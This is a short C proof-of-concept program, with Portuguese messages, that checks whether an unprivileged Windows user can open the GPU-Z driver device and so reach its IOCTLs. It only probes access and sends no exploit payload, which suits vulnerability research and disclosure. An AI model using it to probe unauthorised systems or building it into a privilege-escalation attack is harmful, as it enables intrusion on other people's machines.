// gpuz_aclpoc.c
#define UNICODE
#define _UNICODE
#include <windows.h>
#include <stdio.h>
#include <stdbool.h>

static bool is_elevated(void) {
    HANDLE tok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) return false;
    TOKEN_ELEVATION te = {0};
    DWORD cb = 0;
    BOOL ok = GetTokenInformation(tok, TokenElevation, &te, sizeof(te), &cb);
    CloseHandle(tok);
    return ok ? (te.TokenIsElevated != 0) : false;
}

static bool try_open(DWORD access, const wchar_t *label) {
    HANDLE h = CreateFileW(L"\\\\.\\GPU-Z-v3", access, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD gle = GetLastError();
    if (h != INVALID_HANDLE_VALUE) {
        wprintf(L"[+] OPEN %-12s : OK  (handle=%p)\n", label, h);
        CloseHandle(h);
        return true;
    } else {
        wprintf(L"[-] OPEN %-12s : FAIL (GLE=%lu)\n", label, gle);
        return false;
    }
}

int wmain() {
    wprintf(L"[*] PoC: Improper Access Control em \\\\.\\GPU-Z-v3\n");
    wprintf(L"[*] Processo elevado? %s\n", is_elevated() ? L"SIM (rode como user NORMAL!)" : L"NAO");

    bool ok_rw = try_open(GENERIC_READ|GENERIC_WRITE, L"GENERIC_RW");
    bool ok_r  = try_open(GENERIC_READ,               L"GENERIC_READ");
    bool ok_w  = try_open(GENERIC_WRITE,              L"GENERIC_WRITE");

    if (!is_elevated() && (ok_rw || ok_r || ok_w)) {
        wprintf(L"\n[VULNERAVEL] Usuario nao-admin conseguiu abrir o device.\n");
        wprintf(L"Impacto: qualquer usuario local pode acionar IOCTLs do driver (DoS/Leak/LPE dependendo do handler).\n");
        return 0;
    } else if (is_elevated()) {
        wprintf(L"\n[!] Rode este PoC como usuario comum para comprovar a exposicao.\n");
        return 2;
    } else {
        wprintf(L"\n[NAO VULNERAVEL (superficie de CREATE)] A abertura foi bloqueada para low-priv.\n");
        wprintf(L"Obs.: ainda vale checar se algum IOCTL usa FILE_ANY_ACCESS sem validar privilegios.\n");
        return 1;
    }
}
